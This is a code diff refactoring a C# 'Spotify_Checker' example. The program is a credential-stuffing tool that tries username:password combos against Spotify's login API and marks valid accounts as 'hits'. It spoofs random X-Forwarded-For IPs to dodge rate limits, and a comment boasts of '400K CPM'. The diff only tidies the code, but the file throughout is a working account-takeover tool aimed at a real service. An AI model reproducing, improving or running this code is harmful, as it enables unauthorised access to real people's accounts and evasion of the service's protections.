@@ -9,13 +9,13 @@ using System.Threading.Tasks;
 
 namespace Milky.Examples
 {
-    class Spotify_Checker
+    public class Spotify_Checker
     {
         private static readonly HttpClient _httpClient = new HttpClient();
         private static readonly Random _random = new Random();
         private static readonly object _locker = new object();
 
-        static async Task Main()
+        public static async Task Main()
         {
             var combos = new List<Combo>();
 
@@ -53,13 +53,13 @@ namespace Milky.Examples
 
                         try
                         {
-                            var requestMessage1 = new HttpRequestMessage(HttpMethod.Get, "https://accounts.spotify.com/en/login");
+                            using var requestMessage1 = new HttpRequestMessage(HttpMethod.Get, "https://accounts.spotify.com/en/login");
                             requestMessage1.Headers.TryAddWithoutValidation("X-Forwarded-For", randomIp);
 
-                            var responseMessage1 = await _httpClient.SendAsync(requestMessage1);
+                            using var responseMessage1 = await _httpClient.SendAsync(requestMessage1);
 
                             string csrfToken = Regex.Match(responseMessage1.Headers.ToString(), "csrf_token=(.*?);").Groups[1].Value;
-                            if (string.IsNullOrEmpty(csrfToken)) continue; // Sadly, this checker triggers Spotify Rate limit. Ignoring rate limit, it is able to reach a solid 400K CPM!
+                            if (string.IsNullOrEmpty(csrfToken)) continue; // Sadly, this checker triggers Spotify Rate limit. Ignoring rate limit, it is able to reach a solid 400K CPM (depending on your computer)
 
                             using var requestMessage2 = new HttpRequestMessage(HttpMethod.Post, "https://accounts.spotify.com/api/login")
                             {
@@ -75,14 +75,18 @@ namespace Milky.Examples
                             requestMessage2.Headers.TryAddWithoutValidation("X-Forwarded-For", randomIp);
                             requestMessage2.Headers.TryAddWithoutValidation("User-Agent", "Mozilla");
 
-                            var responseMessage2 = await _httpClient.SendAsync(requestMessage2);
+                            using var responseMessage2 = await _httpClient.SendAsync(requestMessage2);
 
-                            var content2 = await responseMessage2.Content.ReadAsStringAsync();
+                            var contentString2 = await responseMessage2.Content.ReadAsStringAsync();
 
-                            if (content2.Contains("errorInvalidCredentials"))
+                            if (contentString2.Contains("errorInvalidCredentials"))
+                            {
                                 result = CheckResult.Invalid;
-                            else if (content2.Contains("displayName"))
+                            }
+                            else if (contentString2.Contains("displayName"))
+                            {
                                 result = CheckResult.Hit;
+                            }
 
                             // Missing capture, I'm too lazy to add it. If anyone wanna do so, feel free to submit a pull request.
                         }
